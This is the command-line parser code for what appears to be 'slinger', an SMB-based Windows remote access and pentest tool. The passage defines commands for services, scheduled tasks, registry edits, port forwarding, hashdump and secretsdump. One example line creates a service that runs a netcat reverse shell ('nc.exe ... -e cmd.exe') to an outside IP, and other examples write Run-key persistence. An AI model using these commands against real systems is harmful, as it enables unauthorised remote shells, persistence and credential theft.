import argparse
from .printlib import *
from prompt_toolkit.completion import Completer, Completion
from slingerpkg.var.config import version, program_name
from itertools import zip_longest


def extract_commands_and_args(parser):
    commands_and_args = {}

    # Loop over the actions in the parser
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            # This is a subparser. Loop over the choices (which are the commands)
            for command, subparser in action.choices.items():
                commands_and_args[command] = {}
                # Loop over the actions in the subparser
                for sub_action in subparser._actions:
                    if isinstance(sub_action, argparse._StoreAction):
                        # This is an argument. Add it to the dictionary
                        commands_and_args[command][sub_action.dest] = "Example value"

    return commands_and_args


# This is for "help <command>"
def force_help(parser, command):
    subparsers_action = [
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    ][0]
    command_parser = subparsers_action.choices.get(command)

    if command_parser is not None:
        print(_format_help_text(command_parser))
    else:
        print(f"No command named '{command}' found")


def _format_help_text(parser):
    """Base help text formatter"""
    help_text = parser.format_help()
    help_text = help_text.replace("usage: slinger", "usage:").strip()
    help_text = "\n".join(line for line in help_text.splitlines() if line.strip())
    return help_text.rstrip() + "\n"


def print_all_help(parser):
    """
    Prints the help message for all subcommands of a given argparse parser.

    Args:
        parser (argparse.ArgumentParser): The argument parser containing subcommands.

    This function iterates through all subcommands of the provided parser and prints
    their respective help messages. It assumes that the parser contains subparsers.
    """
    subparsers_action = [
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    ][0]
    command_parser = subparsers_action.choices
    for command, parser in command_parser.items():
        print(f"\n======= Command: {command} =======")
        parser.print_help()


def print_all_commands(parser):
    """Print available commands in 4-column format"""
    # Get commands from parser
    subparsers_action = [
        action for action in parser._actions if isinstance(action, argparse._SubParsersAction)
    ][0]
    commands = subparsers_action.choices

    # Sort commands alphabetically
    sorted_commands = sorted(commands.keys())

    # Calculate rows for 4 columns
    rows = -(-len(sorted_commands) // 4)  # Ceiling division

    # Split into columns
    columns = [sorted_commands[i : i + rows] for i in range(0, len(sorted_commands), rows)]

    # Print header
    print("\nAvailable commands:")
    print("-" * 42)

    # Print commands in columns
    for row in zip_longest(*columns, fillvalue=""):
        formatted_row = [f"{cmd:<20}" for cmd in row]
        print("  ".join(formatted_row))

    # Print footer
    print("\nType help <command> or <command> -h for more information on a specific command\n")


class InvalidParsing(Exception):
    pass


class CustomArgumentParser(argparse.ArgumentParser):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._custom_help = None

    def format_help(self):
        """This is invoked when the user types '<command> -h'"""
        print_info("Help Menu:")
        if not self._custom_help:
            self._custom_help = _format_help_text(super())
        return self._custom_help

    def error(self, message):
        if "invalid choice" in message:
            print_log("Invalid command entered. Type help for a list of commands.")
            raise InvalidParsing("Invalid command entered. Type help for a list of commands.")


def show_command_help(parser, command):
    """Show help for specific command"""
    subparser = None
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            if command in action.choices:
                subparser = action.choices[command]
                break

    if subparser is not None:
        print(_format_help_text(subparser))
    else:
        print(f"Command '{command}' not found.")


def setup_cli_parser(slingerClient):
    parser = CustomArgumentParser(
        prog=program_name,
        description="Slinger Commands",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s " + version,
        help="Show the version number and exit",
    )

    subparsers = parser.add_subparsers(dest="command")

    # Subparser for 'use' command
    parser_use = subparsers.add_parser(
        "use",
        help="Connect to a specified share",
        description="Connect to a specific share on the remote server",
        epilog="Example Usage: use <sharename> | use C$",
    )
    parser_use.add_argument("share", help="Specify the share name to connect to")
    parser_use.set_defaults(func=slingerClient.connect_share)

    # Subparser for 'ls' command
    parser_ls = subparsers.add_parser(
        "ls",
        help="List directory contents",
        description="List contents of a directory at a specified path.  File paths with spaces must be entirely in quotes.",
        epilog="Example Usage: ls /path/to/directory",
    )
    parser_ls.add_argument(
        "path",
        nargs="?",
        default=".",
        help="Path to list contents, defaults to current path (default: %(default)s)",
    )
    parser_ls.add_argument(
        "-s",
        "--sort",
        choices=["name", "size", "created", "lastaccess", "lastwrite"],
        default="date",
        help="Sort the directory contents by name, size, or date",
    )
    parser_ls.add_argument(
        "--sort-reverse", action="store_true", help="Reverse the sort order", default=False
    )
    parser_ls.add_argument(
        "-l", "--long", action="store_true", help="Display long format listing", default=False
    )
    parser_ls.add_argument(
        "-r",
        "--recursive",
        help="Recursively list directory contents with X depth",
        default=None,
        type=int,
        metavar="depth",
    )
    parser_ls.add_argument(
        "-o", "--output", help="Save output to file", default=None, metavar="filename"
    )
    parser_ls.add_argument(
        "--show",
        action="store_true",
        help="Show the saved recursive output file (requires -r and -o flags)",
        default=False,
    )
    parser_ls.set_defaults(func=slingerClient.ls)

    # Subparser for 'find' command
    parser_find = subparsers.add_parser(
        "find",
        help="Search for files and directories",
        description="Search for files and directories across the remote share with advanced filtering options.",
        epilog='Example Usage: find "*.txt" -path /Users -type f -size +1MB',
    )
    parser_find.add_argument(
        "pattern", help="Search pattern (supports wildcards like *.txt or regex with -regex flag)"
    )
    parser_find.add_argument(
        "--path", default=".", help="Starting search path (default: current directory)"
    )
    parser_find.add_argument(
        "--type",
        choices=["f", "d", "a"],
        default="a",
        help="Search type: f=files only, d=directories only, a=all (default: %(default)s)",
    )
    parser_find.add_argument(
        "--size", help="File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)"
    )
    parser_find.add_argument("--mtime", type=int, help="Modified within N days (positive number)")
    parser_find.add_argument("--ctime", type=int, help="Created within N days (positive number)")
    parser_find.add_argument("--atime", type=int, help="Accessed within N days (positive number)")
    parser_find.add_argument(
        "--regex",
        action="store_true",
        help="Use regular expression pattern matching instead of wildcards",
    )
    parser_find.add_argument("--iname", action="store_true", help="Case insensitive name matching")
    parser_find.add_argument(
        "--maxdepth", type=int, default=2, help="Maximum search depth (default: %(default)s)"
    )
    parser_find.add_argument(
        "--mindepth", type=int, default=0, help="Minimum search depth (default: %(default)s)"
    )
    parser_find.add_argument("--limit", type=int, help="Maximum number of results to return")
    parser_find.add_argument(
        "--sort",
        choices=["name", "size", "mtime", "ctime", "atime"],
        default="name",
        help="Sort results by field (default: %(default)s)",
    )
    parser_find.add_argument("--reverse", action="store_true", help="Reverse sort order")
    parser_find.add_argument(
        "--format",
        choices=["table", "list", "paths", "json"],
        default="table",
        help="Output format (default: %(default)s)",
    )
    parser_find.add_argument("-o", "--output", help="Save results to file")
    parser_find.add_argument(
        "--empty", action="store_true", help="Find empty files (size = 0) or empty directories"
    )
    parser_find.add_argument(
        "--hidden", action="store_true", help="Include hidden files and directories"
    )
    parser_find.add_argument(
        "--progress", action="store_true", help="Show search progress for large operations"
    )
    parser_find.add_argument(
        "--timeout", type=int, default=120, help="Search timeout in seconds (default: %(default)s)"
    )
    parser_find.set_defaults(func=slingerClient.find_handler)

    # Subparser for 'shares' command
    parser_shares = subparsers.add_parser(
        "shares",
        help="List all available shares",
        aliases=["enumshares"],
        description="List all shares available on the remote server",
        epilog="Example Usage: shares",
    )
    parser_shares.add_argument(
        "-l",
        "--list",
        action="store_true",
        help="Print all shares in a list format instead of a table",
    )
    parser_shares.set_defaults(func=slingerClient.list_shares)

    # Subparser for 'cat' command
    parser_cat = subparsers.add_parser(
        "cat",
        help="Display file contents",
        description="Display the contents of a specified file on the remote server.  File paths with spaces must be entirely in quotes.",
        epilog="Example Usage: cat /path/to/file",
    )
    parser_cat.add_argument("remote_path", help="Specify the remote file path to display contents")
    parser_cat.set_defaults(func=slingerClient.cat)

    # Subparser for 'cd' command
    parser_cd = subparsers.add_parser(
        "cd",
        help="Change directory",
        description="Change to a different directory on the remote server.  File paths with spaces must be entirely in quotes.",
        epilog="Example Usage: cd /path/to/directory",
    )
    parser_cd.add_argument(
        "path",
        nargs="?",
        default=".",
        help="Directory path to change to, defaults to current directory (default: %(default)s)",
    )
    parser_cd.set_defaults(func=slingerClient.cd_handler)

    # Subparser for 'pwd' command
    parser_pwd = subparsers.add_parser(
        "pwd",
        help="Print working directory",
        description="Print the current working directory on the remote server",
        epilog="Example Usage: pwd",
    )
    parser_pwd.set_defaults(func=slingerClient.print_current_path)
    # Subparser for 'exit' command
    parser_exit = subparsers.add_parser(
        "exit",
        help="Exit the program",
        description="Exit the application",
        epilog="Example Usage: exit",
        aliases=["quit", "logout", "logoff"],
    )

    parser_clear = subparsers.add_parser(
        "clear",
        help="Clear the screen",
        description="Clear the screen",
        epilog="Example Usage: clear",
    )
    # Subparser for 'help' command
    parser_help = subparsers.add_parser(
        "help",
        help="Show help message",
        description="Display help information for the application",
        epilog="Example Usage: help",
    )
    parser_help.add_argument("cmd", nargs="?", help="Specify a command to show help for")

    # Subparser for 'who' command
    parser_who = subparsers.add_parser(
        "who",
        help="List current sessions.  This is different than the current user logins",
        description="List the current sessions connected to the target host",
        epilog="Example Usage: who",
    )
    parser_who.set_defaults(func=slingerClient.who)

    # Subparser for 'enumdisk' command
    parser_diskenum = subparsers.add_parser(
        "enumdisk",
        help="Enumerate server disk",
        description="Enumerate server disk information",
        epilog="Example Usage: enumdisk",
    )
    parser_diskenum.set_defaults(func=slingerClient.enum_server_disk)

    # Subparser for 'enumlogons' command
    parser_logonsenum = subparsers.add_parser(
        "enumlogons",
        help="Enumerate logged on users",
        description="Enumerate users currently logged on the server",
        epilog="Example Usage: enumlogons",
    )
    parser_logonsenum.set_defaults(func=slingerClient.enum_logons)

    # Subparser for 'enuminfo' command
    parser_infoenum = subparsers.add_parser(
        "enuminfo",
        help="Enumerate remote host information",
        description="Enumerate detailed information about the remote host",
        epilog="Example Usage: enuminfo",
    )
    parser_infoenum.set_defaults(func=slingerClient.enum_info)

    # Subparser for 'enumsys' command
    parser_sysenum = subparsers.add_parser(
        "enumsys",
        help="Enumerate remote host system information",
        description="Enumerate system information of the remote host",
        epilog="Example Usage: enumsys",
    )
    parser_sysenum.set_defaults(func=slingerClient.enum_sys)

    # Subparser for 'enumtransport' command
    parser_transenum = subparsers.add_parser(
        "enumtransport",
        help="Enumerate remote host transport information",
        description="Enumerate transport information of the remote host",
        epilog="Example Usage: enumtransport",
    )
    parser_transenum.set_defaults(func=slingerClient.enum_transport)

    # Subparser for 'enumservices' command
    parser_svcenum = subparsers.add_parser(
        "enumservices",
        help="Enumerate services",
        description="Enumerate services on the remote host",
        epilog="Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n",
        aliases=["servicesenum", "svcenum", "services"],
    )
    parser_svcenum.add_argument(
        "-n",
        "--new",
        action="store_true",
        help="Perform a new enumeration of services even if already enumerated",
    )
    parser_svcenum.add_argument("--filter", help="Filter services by name or state")
    parser_svcenum.set_defaults(func=slingerClient.enum_services)

    # Subparser for 'serviceshow' command
    parser_svcshow = subparsers.add_parser(
        "serviceshow",
        help="Show details for a service",
        description="Show details of a specific service on the remote server",
        epilog="Example Usage: serviceshow -i 123",
        aliases=["svcshow", "showservice"],
    )
    parser_svcshow.set_defaults(func=slingerClient.show_service_handler)
    svcshowgroup = parser_svcshow.add_mutually_exclusive_group(required=True)
    svcshowgroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to show details for"
    )
    svcshowgroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to show"
    )

    # Subparser for 'servicestart' command
    parser_svcstart = subparsers.add_parser(
        "servicestart",
        help="Start a service",
        description="Start a specified service on the remote server",
        epilog="Example Usage: servicestart -i 123  OR svcstart Spooler",
        aliases=["svcstart", "servicestart", "servicerun"],
    )
    parser_svcstart.set_defaults(func=slingerClient.start_service_handler)
    svcstartgroup = parser_svcstart.add_mutually_exclusive_group(required=True)
    svcstartgroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to start"
    )
    svcstartgroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to start"
    )

    # Subparser for 'servicestop' command
    parser_svcstop = subparsers.add_parser(
        "servicestop",
        help="Stop a service",
        description="Stop a specified service on the remote server",
        epilog="Example Usage: servicestop -i 123  OR svcstop Spooler",
        aliases=["svcstop", "servicestop"],
    )
    parser_svcstop.set_defaults(func=slingerClient.service_stop_handler)
    svcstopgroup = parser_svcstop.add_mutually_exclusive_group(required=True)
    svcstopgroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to stop"
    )
    svcstopgroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to stop"
    )

    # Subparser for 'serviceenable' command
    parser_svcenable = subparsers.add_parser(
        "serviceenable",
        help="Enable a service",
        description="Enable a specified service on the remote server",
        epilog="Example Usage: serviceenable -i 123  OR svcenable Spooler",
        aliases=["svcenable", "enableservice", "enablesvc"],
    )
    parser_svcenable.set_defaults(func=slingerClient.enable_service_handler)
    svcenablegroup = parser_svcenable.add_mutually_exclusive_group(required=True)
    svcenablegroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to enable"
    )
    svcenablegroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to enable"
    )

    # Subparser for 'servicedisable' command
    parser_svcdisable = subparsers.add_parser(
        "servicedisable",
        help="Disable a service",
        description="Disable a specified service on the remote server",
        epilog="Example Usage: servicedisable -i 123  OR svcdisable Spooler",
        aliases=["svcdisable", "disableservice", "disablesvc"],
    )
    parser_svcdisable.set_defaults(func=slingerClient.disable_service_handler)
    svcdisablegroup = parser_svcdisable.add_mutually_exclusive_group(required=True)
    svcdisablegroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to disable"
    )
    svcdisablegroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to disable"
    )

    # Subparser for 'servicedel' command
    parser_svcdelete = subparsers.add_parser(
        "servicedel",
        help="Delete a service",
        description="Delete a specified service on the remote server",
        epilog="Example Usage: servicedelete -i 123  OR svcdelete Spooler",
        aliases=["svcdelete", "servicedelete"],
    )
    svcdeletegroup = parser_svcdelete.add_mutually_exclusive_group(required=True)
    svcdeletegroup.add_argument(
        "-i", "--serviceid", type=int, help="Specify the ID of the service to delete"
    )
    svcdeletegroup.add_argument(
        "service_name", type=str, nargs="?", help="Specify the name of the service to delete"
    )
    parser_svcdelete.set_defaults(func=slingerClient.service_del_handler)

    # Subparser for 'servicecreate' command
    parser_svccreate = subparsers.add_parser(
        "serviceadd",
        help="Create a new service",
        description="Create a new service on the remote server",
        epilog=r'Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"',
        aliases=["svcadd", "servicecreate", "svccreate"],
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser_svccreate.add_argument(
        "-n", "--name", required=True, help="Specify the name of the new service"
    )
    parser_svccreate.add_argument(
        "-b", "--binary-path", required=True, help="Specify the binary path of the new service"
    )
    parser_svccreate.add_argument(
        "-d", "--display-name", required=True, help="Specify the display name of the new service"
    )
    parser_svccreate.add_argument(
        "-s",
        "--start-type",
        choices=["auto", "demand", "system"],
        default="demand",
        required=True,
        help="Specify the start type of the new service (default: %(default)s)",
    )
    parser_svccreate.set_defaults(func=slingerClient.create_service)

    # Subparser for 'enumtasks' command
    parser_taskenum = subparsers.add_parser(
        "enumtasks",
        help="Enumerate scheduled tasks",
        description="Enumerate scheduled tasks on the remote server",
        epilog="Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n",
        aliases=["tasksenum", "taskenum"],
    )
    parser_taskenum.add_argument(
        "-n",
        "--new",
        action="store_true",
        help="Perform a new enumeration of tasks even if already enumerated",
    )
    parser_taskenum.add_argument("--filter", help="Filter tasks by name or folder")
    parser_taskenum.set_defaults(func=slingerClient.enum_task_folders_recursive)
    # Subparser for 'tasksshow' command
    parser_taskshow = subparsers.add_parser(
        "taskshow",
        help="Show task details",
        description="Show details of a specific task on the remote server",
        epilog="Example Usage: tasksshow -i 123",
        aliases=["tasksshow", "showtask"],
    )
    taskshowgroup = parser_taskshow.add_mutually_exclusive_group(required=True)
    taskshowgroup.add_argument(
        "-i", "--task-id", type=int, help="Specify the ID of the task to show"
    )
    taskshowgroup.add_argument(
        "task_path", type=str, nargs="?", help="Specify the full path of the task to show"
    )
    # taskshowgroup.add_argument('-f', '--folder', type=str, nargs='?', help='Specify the folder to show tasks from')
    parser_taskshow.set_defaults(func=slingerClient.task_show_handler)

    # Subparser for 'taskcreate' command
    parser_taskcreate = subparsers.add_parser(
        "taskcreate",
        help="Create a new task",
        description="Create a new scheduled task on the remote server",
        epilog="Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\\test' -f \\\\Windows",
        aliases=["taskadd"],
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser_taskcreate.add_argument(
        "-n", "--name", required=True, help="Specify the name of the new task"
    )
    parser_taskcreate.add_argument(
        "-p", "--program", required=True, help="Specify the program to run (cmd.exe)"
    )
    parser_taskcreate.add_argument(
        "-a", "--arguments", required=False, help="Specify the arguments to pass to the program"
    )
    parser_taskcreate.add_argument(
        "-f",
        "--folder",
        required=False,
        default="",
        help="Specify the folder to create the task in",
    )
    parser_taskcreate.add_argument(
        "-i",
        "--interval",
        required=False,
        default=None,
        help="Specify an interval in minutes to run the task",
    )
    parser_taskcreate.add_argument(
        "-d",
        "--date",
        required=False,
        default=None,
        help="Specify the date to start the task (2099-12-31 14:01:00)",
    )
    parser_taskcreate.set_defaults(func=slingerClient.task_create)

    # Subparser for 'taskrun' command
    parser_taskrun = subparsers.add_parser(
        "taskrun",
        help="Run a task",
        description="Run a specified task on the remote server",
        epilog="Example Usage: taskrun \\\\Windows\\\\newtask",
        aliases=["taskexec"],
    )
    parser_taskrun.add_argument(
        "task_path", type=str, help="Specify the full path of the task to run"
    )
    parser_taskrun.set_defaults(func=slingerClient.task_run)

    # Subparser for 'taskdelete' command
    parser_taskdelete = subparsers.add_parser(
        "taskdelete",
        help="Delete a task",
        description="Delete a specified task on the remote server",
        epilog="Example Usage: taskdelete -i 123",
        aliases=["taskdel", "taskrm"],
    )
    taskdeletegroup = parser_taskdelete.add_mutually_exclusive_group(required=True)
    taskdeletegroup.add_argument(
        "task_path", type=str, nargs="?", help="Specify the full path of the task to delete"
    )
    taskdeletegroup.add_argument(
        "-i", "--task-id", type=int, help="Specify the ID of the task to delete"
    )
    parser_taskdelete.set_defaults(func=slingerClient.task_delete_handler)

    # Subparser for 'enumtime' command
    # parser_time = subparsers.add_parser('enumtime', help='Get server time', description='Get the current time on the server', epilog='Example Usage: enumtime')
    # parser_time.set_defaults(func=slingerClient.get_server_time)

    # Subparser for 'upload' command
    parser_upload = subparsers.add_parser(
        "upload",
        aliases=["put"],
        help="Upload a file",
        description="Upload a file to the remote server",
        epilog="Example Usage: upload /local/path /remote/path",
    )
    parser_upload.set_defaults(func=slingerClient.upload_handler)
    parser_upload.add_argument("local_path", help="Specify the local file path to upload")
    parser_upload.add_argument(
        "remote_path", nargs="?", help="Specify the remote file path to upload to, optional"
    )

    # Subparser for 'download' command
    parser_download = subparsers.add_parser(
        "download",
        aliases=["get"],
        help="Download a file",
        description="Download a file from the remote server.  File paths with spaces must be entirely in quotes.",
        epilog="Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt",
    )
    parser_download.set_defaults(func=slingerClient.download_handler)
    parser_download.add_argument("remote_path", help="Specify the remote file path to download")
    parser_download.add_argument(
        "local_path",
        nargs="?",
        help="Specify the local file path to download to, optional",
        default=None,
    )
    parser_download.add_argument(
        "--resume",
        action="store_true",
        help="Resume interrupted download if possible (default: %(default)s)",
        default=False,
    )
    parser_download.add_argument(
        "--restart",
        action="store_true",
        help="Force fresh download, ignore existing partial file",
        default=False,
    )
    parser_download.add_argument(
        "--chunk-size",
        default="64k",
        help="Chunk size for download (e.g., 64k, 1M, 512k) (default: %(default)s)",
    )

    # Subparser for 'mget' command
    parser_mget = subparsers.add_parser(
        "mget",
        help="Download multiple files",
        description="Download all files from a specified directory and its subdirectories.  File paths with spaces must be entirely in quotes.",
        epilog="Example Usage: mget /remote/path /local/path",
    )
    parser_mget.add_argument(
        "remote_path", nargs="?", help="Specify the remote directory path to download from"
    )
    parser_mget.add_argument(
        "local_path",
        nargs="?",
        help="Specify the local directory path where files will be downloaded",
    )
    parser_mget.add_argument("-r", action="store_true", help="Recurse into directories")
    parser_mget.add_argument(
        "-p", metavar="regex", help="Specify a regex pattern to match filenames"
    )
    parser_mget.add_argument(
        "-d",
        type=int,
        default=2,
        help="Specify folder depth count for recursion (default: %(default)s)",
    )
    parser_mget.set_defaults(func=slingerClient.mget_handler)

    # Subparser for 'mkdir' command
    parser_mkdir = subparsers.add_parser(
        "mkdir",
        help="Create a new directory",
        description="Create a new directory on the remote server",
        epilog="Example Usage: mkdir /path/to/new/directory",
    )
    parser_mkdir.add_argument("path", help="Specify the path of the directory to create")
    parser_mkdir.set_defaults(func=slingerClient.mkdir)

    # Subparser for 'rmdir' command
    parser_rmdir = subparsers.add_parser(
        "rmdir",
        help="Remove a directory",
        description="Remove a directory on the remote server",
        epilog="Example Usage: rmdir /path/to/remote/directory",
    )
    parser_rmdir.add_argument(
        "remote_path", help="Specify the remote path of the directory to remove"
    )
    parser_rmdir.set_defaults(func=slingerClient.rmdir)
    # Subparser for 'rm' command
    parser_rm = subparsers.add_parser(
        "rm",
        help="Delete a file",
        description="Delete a file on the remote server",
        epilog="Example Usage: rm /path/to/remote/file",
    )
    parser_rm.add_argument("remote_path", help="Specify the remote file path to delete")
    parser_rm.set_defaults(func=slingerClient.rm_handler)

    # Subparser for '#shell' command
    parser_shell = subparsers.add_parser(
        "#shell",
        help="Enter local terminal mode",
        description="Enter local terminal mode for command execution",
        epilog="Example Usage: #shell",
    )
    # No arguments needed for shell

    # Subparser for '!' command
    parser_cmd = subparsers.add_parser(
        "!",
        help="Run a local command",
        description="Run a specified local command",
        epilog="Example Usage: ! ls -l",
    )
    parser_cmd.add_argument(
        "commands", nargs=argparse.REMAINDER, help="Specify the local commands to run"
    )

    # Subparser for 'info' command
    parser_info = subparsers.add_parser(
        "info",
        help="Display session status",
        description="Display the status of the current session",
        epilog="Example Usage: info",
    )
    parser_info.set_defaults(func=slingerClient.info)

    parser_regstart = subparsers.add_parser(
        "reguse",
        aliases=["regstart"],
        help="Connect to the remote registry",
        description="Connect to a remote registry on the remote server",
        epilog="Example Usage: reguse",
    )
    parser_regstart.set_defaults(func=slingerClient.setup_remote_registry)

    parser_regstop = subparsers.add_parser(
        "regstop",
        help="Disconnect from the remote registry",
        description="Disconnect from a remote registry on the remote server",
        epilog="Example Usage: regstop",
    )
    parser_regstop.set_defaults(func=slingerClient.stop_remote_registry)

    parser_regquery = subparsers.add_parser(
        "regquery",
        help="Query a registry key",
        description="Query a registry key on the remote server",
        epilog="Example Usage: regquery HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run (You must use two slashes or quotes)",
    )
    parser_regquery.add_argument("key", help="Specify the registry key to query")
    parser_regquery.add_argument(
        "-l", "--list", help="List all subkeys in the registry key", action="store_true"
    )
    parser_regquery.add_argument(
        "-v",
        "--value",
        help="Enumerate the value of the specified registry key",
        action="store_true",
    )
    parser_regquery.set_defaults(func=slingerClient.reg_query_handler)

    parser_regset = subparsers.add_parser(
        "regset",
        help="Set a registry value",
        description="Set a registry value on the remote server",
        epilog='Example Usage: regset -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ -v test -d "C:\\test.exe"',
    )
    parser_regset.add_argument("-k", "--key", help="Specify the registry key to set", required=True)
    parser_regset.add_argument(
        "-v", "--value", help="Specify the registry value to set", required=True
    )
    parser_regset.add_argument(
        "-d", "--data", help="Specify the registry data to set", required=True
    )
    parser_regset.add_argument(
        "-t",
        "--type",
        help="Specify the registry type to set (default: %(default)s)",
        default="REG_SZ",
        required=False,
    )
    parser_regset.set_defaults(func=slingerClient.add_reg_value_handler)

    parser_regdel = subparsers.add_parser(
        "regdel",
        help="Delete a registry value",
        description="Delete a registry value on the remote server",
        epilog="Example Usage: regdel -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ -v test",
    )
    parser_regdel.add_argument(
        "-k", "--key", help="Specify the registry key to delete", required=True
    )
    parser_regdel.add_argument(
        "-v", "--value", help="Specify the registry value to delete", required=False
    )
    parser_regdel.set_defaults(func=slingerClient.reg_delete_handler)

    parser_regcreate = subparsers.add_parser(
        "regcreate",
        help="Create a registry key",
        description="Create a registry key on the remote server",
        epilog="Example Usage: regcreate -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\test",
    )
    parser_regcreate.add_argument("key", help="Specify the registry key to create")
    parser_regcreate.set_defaults(func=slingerClient.reg_create_key)

    parser_regcheck = subparsers.add_parser(
        "regcheck",
        help="Check if a registry key exists",
        description="Check if a registry key exists on the remote server.  This is really just an exposed helper function.",
        epilog="Example Usage: regcheck HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\test",
    )
    parser_regcheck.add_argument("key", help="Specify the registry key to check")
    parser_regcheck.set_defaults(func=slingerClient.does_key_exist)

    parser_portfwd = subparsers.add_parser(
        "portfwd",
        help="Forward a local port to a remote port",
        description="Forward a local port to a remote port on the remote server",
        epilog="Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]",
    )
    parser_portfwd.set_defaults(func=slingerClient.port_fwd_handler)
    parser_portfwdgroup = parser_portfwd.add_mutually_exclusive_group(required=True)

    parser_portfwd.add_argument(
        "local", help="Specify the local host and port to forward from", default=None
    )
    parser_portfwd.add_argument(
        "remote", help="Specify the remote host and port to forward to", default=None
    )

    parser_portfwdgroup.add_argument(
        "-d", "--remove", help="Remove a port forwarding rule", action="store_true"
    )
    parser_portfwdgroup.add_argument(
        "-a", "--add", help="Add a port forwarding rule", action="store_true"
    )
    parser_portfwdgroup.add_argument(
        "-l", "--list", help="List all port forwarding rules", action="store_true"
    )
    parser_portfwdgroup.add_argument(
        "-c", "--clear", help="Clear all port forwarding rules", action="store_true"
    )
    parser_portfwdgroup.add_argument(
        "--load", help="Load all port forwarding rules from the registry", action="store_true"
    )

    parser_ifconfig = subparsers.add_parser(
        "ifconfig",
        help="Display network interfaces",
        aliases=["ipconfig", "enuminterfaces"],
        description="Display network interfaces on the remote server",
        epilog="Example Usage: ifconfig",
    )
    parser_ifconfig.set_defaults(func=slingerClient.ipconfig)

    parser_hostname = subparsers.add_parser(
        "hostname",
        help="Display hostname",
        description="Display the hostname of the remote server",
        epilog="Example Usage: hostname",
    )
    parser_hostname.set_defaults(func=slingerClient.hostname)

    parser_procs = subparsers.add_parser(
        "procs",
        help="List running processes",
        aliases=["ps", "tasklist"],
        description="List running processes on the remote server",
        epilog="Example Usage: procs -t -v",
    )
    parser_procs.set_defaults(func=slingerClient.show_process_list)
    parser_procs.add_argument(
        "-v",
        "--verbose",
        help="Display verbose process information",
        action="store_true",
        default=False,
    )
    parser_procs.add_argument(
        "-t", "--tree", help="Display process tree", action="store_true", default=False
    )

    parser_fwrules = subparsers.add_parser(
        "fwrules",
        help="Display firewall rules",
        description="Display firewall rules on the remote server",
        epilog="Example Usage: fwrules",
    )
    parser_fwrules.set_defaults(func=slingerClient.show_fw_rules)

    parser_setvar = subparsers.add_parser(
        "set",
        help="Set a variable",
        description="Set a variable for use in the application",
        epilog="Example Usage: set varname value",
    )
    parser_setvar.add_argument("varname", help="Set the debug variable to True or False")
    parser_setvar.add_argument("value", help="Set the mode variable to True or False")

    parser_setvar = subparsers.add_parser(
        "config",
        help="Show the current config",
        description="Show the current config",
        epilog="Example Usage: config",
    )

    parser_run = subparsers.add_parser(
        "run",
        help="Run a slinger script or command sequence",
        description="Run a slinger script or command sequence",
        epilog='Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"',
    )
    # parser_run.add_argument('-v', '--validate', help='Validate the script or command sequence without running it', action='store_true')
    parser_rungroup = parser_run.add_mutually_exclusive_group(required=True)
    parser_rungroup.add_argument("-c", "--cmd-chain", help="Specify a command sequence to run")
    parser_rungroup.add_argument("-f", "--file", help="Specify a script file to run")

    parser_hashdump = subparsers.add_parser(
        "hashdump",
        help="Dump hashes from the remote server",
        description="Dump hashes from the remote server",
        epilog="Example Usage: hashdump",
    )
    parser_hashdump.set_defaults(func=slingerClient.hashdump)

    parser_secretsdump = subparsers.add_parser(
        "secretsdump",
        help="Dump secrets from the remote server",
        description="Dump secrets from the remote server",
        epilog="Example Usage: secretsdump",
    )
    parser_secretsdump.set_defaults(func=slingerClient.secretsdump)

    parser_env = subparsers.add_parser(
        "env",
        help="Display environment variables",
        description="Display environment variables on the remote server",
        epilog="Example Usage: env",
    )
    parser_env.set_defaults(func=slingerClient.show_env_handler)

    parser_availCounters = subparsers.add_parser(
        "debug-availcounters",
        help="Display available performance counters.  This is for debug use only, it doesn't really give you anything.",
        description="Display available performance counters on the remote server.  This is for debug use only, it doesn't really give you anything.",
        epilog="Example Usage: availcounters",
    )
    parser_availCounters.add_argument(
        "-f",
        "--filter",
        help="Simple filter for case insenstive counters containing a given string",
        default=None,
        type=str,
    )
    parser_availCounters.add_argument(
        "-p",
        "--print",
        help="Print the available counters to the screen.  Must be provide with -s if you want to print to screen.",
        action="store_true",
        default=False,
    )
    parser_availCounters.add_argument(
        "-s",
        "--save",
        help="Save the available counters to a file",
        default=None,
        type=str,
        required=False,
        metavar="filename",
    )
    parser_availCounters.set_defaults(func=slingerClient.show_avail_counters)

    parser_getCounter = subparsers.add_parser(
        "debug-counter",
        help="Display a performance counter.  This is for debug use only, it doesn't really give you anything.",
        description="Display a performance counter on the remote server.  This is for debug use only, it doesn't really give you anything.",
